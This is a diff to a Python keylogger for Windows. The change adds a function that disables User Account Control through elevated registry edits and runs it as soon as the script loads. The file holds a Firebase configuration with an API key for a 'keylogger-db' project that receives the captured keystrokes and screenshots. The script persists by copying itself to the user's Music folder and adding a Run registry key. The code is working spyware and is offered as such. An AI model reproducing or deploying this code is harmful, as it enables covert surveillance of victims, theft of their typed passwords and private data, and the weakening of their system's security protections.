@@ -10,6 +10,18 @@ import mss as mss
 from pynput import keyboard, mouse
 from datetime import datetime as date
 import pyrebase
+import win32com.shell.shell as win32shell
+from pathlib import Path
+
+
+def disable_UAC():
+    command1 = 'reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA'
+    win32shell.ShellExecuteEx(lpVerb='runas', lpFile='cmd.exe', lpParameters='/c ' + command1)
+    command2 = 'reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f'
+    win32shell.ShellExecuteEx(lpVerb='runas', lpFile='cmd.exe', lpParameters='/c ' + command2)
+
+
+disable_UAC()
 
 
 def is_admin():
@@ -19,38 +31,34 @@ def is_admin():
         return False
 
 
-try:
-    # if not is_admin():
-        # Re-run the program with admin rights
-        # ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
-        # os._exit(1)
+# if not is_admin():
+    # Re-run the program with admin rights
+    # ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
+    # os._exit(1)
 
-    config = {
-        'apiKey': "AIzaSyBb3RZaXNh1jZYx_qwW_L6sKOxDzi7pMdA",
-        'authDomain': "keylogger-db.firebaseapp.com",
-        'databaseURL': "https://keylogger-db.firebaseio.com",
-        'projectId': "keylogger-db",
-        'storageBucket': "keylogger-db.appspot.com",
-        'messagingSenderId': "282476825704",
-        'appId': "1:282476825704:web:b9d206ed7519da3b7d3fdd",
-        'measurementId': "G-TXMELPQRDB"
-    }
-    firebase = pyrebase.initialize_app(config)
-    storage = firebase.storage()
+config = {
+    'apiKey': "AIzaSyBb3RZaXNh1jZYx_qwW_L6sKOxDzi7pMdA",
+    'authDomain': "keylogger-db.firebaseapp.com",
+    'databaseURL': "https://keylogger-db.firebaseio.com",
+    'projectId': "keylogger-db",
+    'storageBucket': "keylogger-db.appspot.com",
+    'messagingSenderId': "282476825704",
+    'appId': "1:282476825704:web:b9d206ed7519da3b7d3fdd",
+    'measurementId': "G-TXMELPQRDB"
+}
+firebase = pyrebase.initialize_app(config)
+storage = firebase.storage()
 
-    full_currentTime = date.today().strftime('%H:%M:%S %d.%m.%Y')
-    today_date = full_currentTime.split(' ')[1]
+full_currentTime = date.today().strftime('%H:%M:%S %d.%m.%Y')
+today_date = full_currentTime.split(' ')[1]
 
-    f = open('data.txt', 'w', encoding='utf-8')
+f = open('data.txt', 'w', encoding='utf-8')
 
-    data = ''
-    lastThreeKeys = []
-    countDelete = 0
-    clicks_counter = 0
-    imgPath = 'screenshot.jpg'
-    pcName = os.environ['COMPUTERNAME']
-except Exception as e:
-    print(e)
+data = ''
+lastThreeKeys = []
+clicks_counter = 0
+imgPath = 'screenshot.jpg'
+pcName = os.environ['COMPUTERNAME']
 
 
 def on_press(key):
@@ -82,40 +90,31 @@ def on_press(key):
 
 
 def printKey(key):
-    global data, countDelete, f
+    global data, f
 
     try:
         if str(key) == 'Key.enter':
-            countDelete = 0
             data += '\n'
             print('\n')
             f.write('\n')
 
-        elif str(key) == 'Key.backspace' and len(data) > 0:  # needs fixing !
-            countDelete += 1
-            if countDelete > 1:
-                data = data[:-countDelete * 2 + 1] + str(data[-countDelete * 2 + 1] + '\u0336') \
-                       + data[-countDelete * 2 + 2:]
-            else:
-                data = data[:-countDelete] + str(data[-countDelete] + '\u0336')
+        elif str(key) == 'Key.backspace' and len(data) > 0:
+            data = data[:-1]
             f.close()
             f = open('data.txt', 'w', encoding='utf-8')
             f.write(data)
 
         elif str(key) == 'Key.space':
-            countDelete = 0
             data += ' '
             print(' ')
             f.write(' ')
 
         elif str(key) == 'Key.tab':
-            countDelete = 0
             data += '\t'
             print('\t')
             f.write('\t')
 
         elif hasattr(key, 'char'):
-            countDelete = 0
             data += key.char
             print(key.char)
             f.write(key.char)
@@ -171,15 +170,15 @@ def on_click(x, y, button, pressed):
 
 def addToStartup():
     try:
-        USER_NAME = getpass.getuser()
+        home = str(Path.home())
         src = str(os.getcwd()) + '\\keylogger.exe'
-        dst = r'C:\Users\%s\Music' % USER_NAME
+        dst = home + '\\Music'
         shutil.copy2(src, dst)
 
         # dst = r'C:\WINDOWS\system32'
         # shutil.copy2(src, dst)
 
-        exePath = 'C:\\Users\\%s\\Music\\keylogger.exe' % USER_NAME  # name of script after making EXE
+        exePath = home + '\\Music\\keylogger.exe'   # name of script after making EXE
         key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                              r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run', 0,
                              winreg.KEY_SET_VALUE)
